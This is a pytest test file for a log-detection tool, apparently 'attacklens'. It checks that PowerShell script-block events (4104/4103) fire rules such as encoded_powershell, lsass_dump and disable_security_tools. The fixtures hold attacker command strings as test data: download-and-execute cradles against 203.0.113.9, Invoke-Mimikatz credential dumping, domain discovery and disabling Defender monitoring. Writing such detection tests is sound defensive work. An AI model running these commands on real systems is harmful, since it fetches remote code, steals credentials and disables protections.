"""PowerShell/Operational 4104 (ScriptBlockText) / 4103 (Payload) rows: action 'script_exec' (config/sources.yaml
action_map.event_ids) and the command_line content rules that also read script blocks (config/rules.yaml).

Process-tree rules (parent / child image) stay proc_start-only: a script block has no process_name / parent_process.
Fixtures are hand-written (invented hosts, documentation IPs), not copied from any dataset."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from attacklens import detect, detect_sql

from .conftest import make_events_parquet, query, run_ingest
from .test_detect import T0, proc

PS_CHANNEL = {"SourceName": "Microsoft-Windows-PowerShell", "Channel": "Microsoft-Windows-PowerShell/Operational",
              "Hostname": "WS-ACC-07.lab.example"}
CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')"
MODULE = ("# Copyright (c) Microsoft Corporation.\nfunction Set-Prompt { param([string]$Name)\n"
          "  Import-Module -Name PSReadLine; Set-PSReadLineOption -EditMode Windows\n"
          "  Out-File -FilePath $env:TEMP\\p.txt -Encoding UTF8 -InputObject $Name }")


def block(text: str, event_id: int = 4104) -> dict:
    """Canonical script-block row as ingest writes it: no process image, the script text in command_line."""
    return {"ts_ms": T0, "action": "script_exec", "event_id": event_id, "host": "ws-hr-012", "src_user": "pmehta",
            "command_line": text}


CASES = [
    # widened content rules fire on script blocks
    ("4104 download cradle", block(CRADLE), {"encoded_powershell"}),
    ("4104 nop hidden relaunch", block("Start-Process powershell -ArgumentList ' -nop -w hidden -c iex $p'"),
     {"encoded_powershell"}),
    ("4104 base64 iex", block("iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"),
     {"encoded_powershell"}),
    ("4103 payload cradle", block("CommandInvocation(Invoke-Expression): Invoke-WebRequest http://203.0.113.9/s "
                                  "| Invoke-Expression", 4103), {"encoded_powershell"}),
    ("4104 invoke-mimikatz", block("Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"), {"lsass_dump"}),
    ("4104 net group", block("net group 'Domain Admins' /domain"), {"discovery_commands"}),
    ("4104 get-aduser", block("Get-ADUser -Filter * -Properties MemberOf"), {"discovery_commands"}),
    ("4104 whoami", block("$u = whoami /all; $u | Out-String"), {"discovery_system"}),
    ("4104 set-mppreference", block("Set-MpPreference -DisableRealtimeMonitoring $true"),
     {"disable_security_tools"}),
    # benign script blocks fire nothing
    ("4104 module load", block(MODULE), set()),
    ("4103 get-process", block("CommandInvocation(Get-Process)", 4103), set()),
    ("4104 systeminfo variable", block("$systemInfo = Get-CimInstance Win32_OperatingSystem"), set()),
    ("4104 -enc flag text only", block("Get-Content $f -Encoding Byte | Set-Content $g -Encoding Byte"), set()),
    ("4104 compress-archive", block("Compress-Archive -Path C:\\logs -DestinationPath C:\\bak\\l.zip"), set()),
    # the same text on a non-script, non-process row stays silent
    ("other row cradle", {**block(CRADLE), "action": "other", "event_id": 4100}, set()),
    # proc_start fixtures unchanged
    ("proc encoded", proc(T0, "powershell.exe", "powershell.exe -enc SQBFAFgA", "cmd.exe"), {"encoded_powershell"}),
    ("proc -enc in cmd.exe", proc(T0, "cmd.exe", "cmd.exe /c type a -encoding x"), set()),
    ("proc office child", proc(T0, "powershell.exe", "powershell.exe -enc SQBFAFgA", "winword.exe"),
     {"office_spawns_script"}),
]


@pytest.fixture(scope="module")
def fired(tmp_path_factory: pytest.TempPathFactory) -> dict[str, set[str]]:
    """All cases in one events set; every match rule's rule_sql() runs once, hits mapped back by source_seq."""
    assert len({c[0] for c in CASES}) == len(CASES), "case names must be unique"
    rows = [{**row, "source_seq": 7000 + k} for k, (_, row, _) in enumerate(CASES)]
    ctx = make_events_parquet(tmp_path_factory.mktemp("psb"), rows)
    try:
        detect_sql.prepare(ctx.con, ctx.cfg)
        rules, th = detect.rules_and_thresholds(ctx.cfg)
        detect.build_match_hits(ctx.con, rules, ctx.cfg["ioc"], th)
        out: dict[str, set[str]] = {c[0]: set() for c in CASES}
        for r in rules:
            if r["kind"] != "match":
                continue
            for (s,) in ctx.con.execute(f"SELECT source_seq FROM ({detect.rule_sql(ctx.con, r, th)})").fetchall():
                out[CASES[int(s) - 7000][0]].add(r["id"])
    finally:
        ctx.con.close()
    return out


@pytest.mark.parametrize("desc,row,expected", CASES, ids=[c[0] for c in CASES])
def test_script_block_rules(fired, desc: str, row: dict, expected: set[str]) -> None:
    assert fired[desc] == expected


def test_ingest_maps_4104_4103_to_script_exec(tmp_path: Path) -> None:
    """Raw NXLog-shape lines -> action 'script_exec'; the cradle row then fires encoded_powershell, the module
    load row nothing."""
    lines = [{**PS_CHANNEL, "EventID": 4104, "@timestamp": "2026-10-24T12:07:00.000Z", "MessageNumber": "1",
              "MessageTotal": "1", "ScriptBlockText": CRADLE, "ScriptBlockId": "{11111111-2222-3333-4444-5555}"},
             {**PS_CHANNEL, "EventID": 4104, "@timestamp": "2026-10-24T12:07:05.000Z", "MessageNumber": "1",
              "MessageTotal": "1", "ScriptBlockText": MODULE, "ScriptBlockId": "{66666666-7777-8888-9999-0000}"},
             {**PS_CHANNEL, "EventID": 4103, "@timestamp": "2026-10-24T12:07:10.000Z",
              "ContextInfo": "Host Application = powershell.exe", "Payload": "CommandInvocation(Get-Process)"}]
    raw = tmp_path / "raw" / "nxlog"
    raw.mkdir(parents=True)
    (raw / "ps.json").write_text("\n".join(json.dumps(x) for x in lines) + "\n", encoding="utf-8")
    ctx = run_ingest(tmp_path / "raw", tmp_path)
    try:
        rows = query(ctx, "SELECT event_id, action, command_line, source_seq FROM events ORDER BY ts_ms")
        assert [(r["event_id"], r["action"]) for r in rows] == [(4104, "script_exec")] * 2 + [(4103, "script_exec")]
        detect_sql.prepare(ctx.con, ctx.cfg)
        rules, th = detect.rules_and_thresholds(ctx.cfg)
        detect.build_match_hits(ctx.con, rules, ctx.cfg["ioc"], th)
        hits = {(r["id"], s) for r in rules if r["kind"] == "match"
                for (s,) in ctx.con.execute(f"SELECT source_seq FROM ({detect.rule_sql(ctx.con, r, th)})").fetchall()}
        assert hits == {("encoded_powershell", rows[0]["source_seq"])}
    finally:
        ctx.con.close()
